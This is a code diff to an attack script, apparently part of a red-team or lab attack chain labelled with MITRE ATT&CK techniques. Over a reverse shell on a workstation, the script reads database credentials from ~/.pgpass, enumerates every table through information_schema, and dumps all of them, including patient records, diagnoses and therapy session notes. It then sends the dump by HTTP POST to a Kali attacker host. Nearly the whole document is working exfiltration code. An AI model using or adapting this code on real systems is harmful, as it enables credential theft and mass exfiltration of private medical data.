@@ -9,8 +9,9 @@ from chainlog import log, run_remote
 # =============================================================================
 # exfiltrate_db.py — DB Exfiltration from John's Workstation
 # MITRE ATT&CK:
-#   T1552.001 – Credentials In Files   (read ~/.pgpass for DB credentials)
-#   T1213     – Data from Information Repositories (psql dump of patients, session_notes + appointments)
+#   T1552.001 – Credentials In Files        (read ~/.pgpass for DB credentials)
+#   T1082     – System Information Discovery (enumerate tables via information_schema)
+#   T1213     – Data from Information Repositories (psql dump of all discovered tables)
 #   T1041     – Exfiltration Over C2 Channel (HTTP POST back to kali)
 # =============================================================================
 
@@ -98,12 +99,28 @@ def _discover_db_creds(john_shell):
     return None
 
 
+def _list_tables(john_shell, psql_env, psql_base):
+    """Query information_schema to discover all user tables in the public schema."""
+    log("[*] Enumerating tables via information_schema ...")
+    raw = run_remote(
+        john_shell,
+        f"{psql_env}{psql_base} "
+        f"-c \"SELECT table_name FROM information_schema.tables "
+        f"WHERE table_schema = 'public' AND table_type = 'BASE TABLE' "
+        f"ORDER BY table_name;\"",
+        timeout=10,
+    )
+    # Only accept valid SQL identifiers to filter out shell prompt noise.
+    tables = [
+        line.strip() for line in raw.splitlines()
+        if re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$', line.strip())
+    ]
+    log(f"[+] Discovered tables: {', '.join(tables) if tables else '(none)'}")
+    return tables
+
+
 def _dump_db(john_shell, creds):
-    """
-    Dump patients, session_notes, and appointments to DUMP_PATH via psql.
-    waystar-readonly has SELECT on all three — more than the webserver's
-    waystar-app (INSERT-only on appointments).
-    """
+    """Enumerate all tables in the public schema, then dump each one to DUMP_PATH."""
     # PGPASSFILE avoids shell-quoting issues with special characters in the password.
     psql_env  = f"PGPASSFILE={PGPASS_PATH} PGSSLMODE=disable "
     psql_base = (
@@ -111,65 +128,41 @@ def _dump_db(john_shell, creds):
         f"-U {creds['user']} -d {creds['dbname']} -t -A -F ,"
     )
 
-    log("[*] Dumping patients table ...")
-    run_remote(
-        john_shell,
-        f"{psql_env}{psql_base} "
-        f"-c \"SELECT id,first_name,last_name,dob,gender,ins_number,"
-        f"phone,email,street,city,postal_code,diagnosis FROM patients;\""
-        f" > {DUMP_PATH} 2>/dev/null",
-        timeout=20,
-    )
-    row_count_raw = run_remote(
-        john_shell,
-        f"{psql_env}{psql_base} -c 'SELECT COUNT(*) FROM patients;'",
-        timeout=10,
-    )
-    row_count = _first_int(row_count_raw)
-    log(f"[+] patients: {row_count} rows")
+    tables = _list_tables(john_shell, psql_env, psql_base)
+    if not tables:
+        log("[-] No tables found — nothing to dump")
+        return {}
 
-    log("[*] Dumping session_notes table ...")
-    run_remote(
-        john_shell,
-        f"echo '--- session_notes ---' >> {DUMP_PATH} && "
-        f"{psql_env}{psql_base} "
-        f"-c \"SELECT id,patient_id,therapist,session_date,session_type,"
-        f"duration_min,content FROM session_notes;\""
-        f" >> {DUMP_PATH} 2>/dev/null",
-        timeout=20,
-    )
-    notes_count_raw = run_remote(
-        john_shell,
-        f"{psql_env}{psql_base} -c 'SELECT COUNT(*) FROM session_notes;'",
-        timeout=10,
-    )
-    notes_count = _first_int(notes_count_raw)
-    log(f"[+] session_notes: {notes_count} rows")
+    stats = {}
+    for i, table in enumerate(tables):
+        log(f"[*] Dumping table '{table}' ...")
 
-    log("[*] Dumping appointments table ...")
-    run_remote(
-        john_shell,
-        f"echo '--- appointments ---' >> {DUMP_PATH} && "
-        f"{psql_env}{psql_base} "
-        f"-c \"SELECT id,full_name,email,preferred_date,preferred_time,"
-        f"focus,notes,source_ip,status FROM appointments;\""
-        f" >> {DUMP_PATH} 2>/dev/null",
-        timeout=20,
-    )
-    appt_count_raw = run_remote(
-        john_shell,
-        f"{psql_env}{psql_base} -c 'SELECT COUNT(*) FROM appointments;'",
-        timeout=10,
-    )
-    appt_count = _first_int(appt_count_raw)
-    log(f"[+] appointments: {appt_count} rows")
+        if i == 0:
+            redirect = f"> {DUMP_PATH}"
+        else:
+            run_remote(john_shell, f"echo '--- {table} ---' >> {DUMP_PATH}", timeout=5)
+            redirect = f">> {DUMP_PATH}"
+
+        run_remote(
+            john_shell,
+            f"{psql_env}{psql_base} -c \"SELECT * FROM {table};\" {redirect} 2>/dev/null",
+            timeout=20,
+        )
+
+        count_raw = run_remote(
+            john_shell,
+            f"{psql_env}{psql_base} -c 'SELECT COUNT(*) FROM {table};'",
+            timeout=10,
+        )
+        count = _first_int(count_raw)
+        log(f"[+] {table}: {count} rows")
+        stats[table] = count
 
     size_raw = run_remote(john_shell, f"wc -c < {DUMP_PATH} 2>/dev/null || echo 0")
     size = _first_int(size_raw)
     log(f"[+] Dump written to {DUMP_PATH} ({size} bytes)")
-
-    return {"patients": row_count, "session_notes": notes_count,
-            "appointments": appt_count, "dump_bytes": size}
+    stats["dump_bytes"] = size
+    return stats
 
 
 def _send_to_kali(john_shell, kali_host, port=EXFIL_HTTP_PORT):
@@ -198,7 +191,7 @@ def _send_to_kali(john_shell, kali_host, port=EXFIL_HTTP_PORT):
 
 def run(john_shell, kali_host=KALI_HOST, db_creds=None):
     """
-    Dump patients, session_notes, and appointments from the DB and exfiltrate to kali.
+    Discover all DB tables, dump them, and exfiltrate to kali.
 
     Args:
         john_shell (socket): reverse shell as john.stravidis on ubuntu_workstation.
@@ -251,12 +244,10 @@ def run(john_shell, kali_host=KALI_HOST, db_creds=None):
         log(f"[+] Removed {EXFIL_LOCAL_PATH} from kali")
 
     if exfil_ok:
-        log(
-            f"[+] Exfiltration complete — "
-            f"{stats.get('patients', '?')} patients, "
-            f"{stats.get('session_notes', '?')} session notes, "
-            f"{stats.get('appointments', '?')} appointments"
+        table_summary = ", ".join(
+            f"{t}: {rows} rows" for t, rows in stats.items() if t != "dump_bytes"
         )
+        log(f"[+] Exfiltration complete — {table_summary}")
     else:
         log("[-] Exfiltration finished with errors")
 
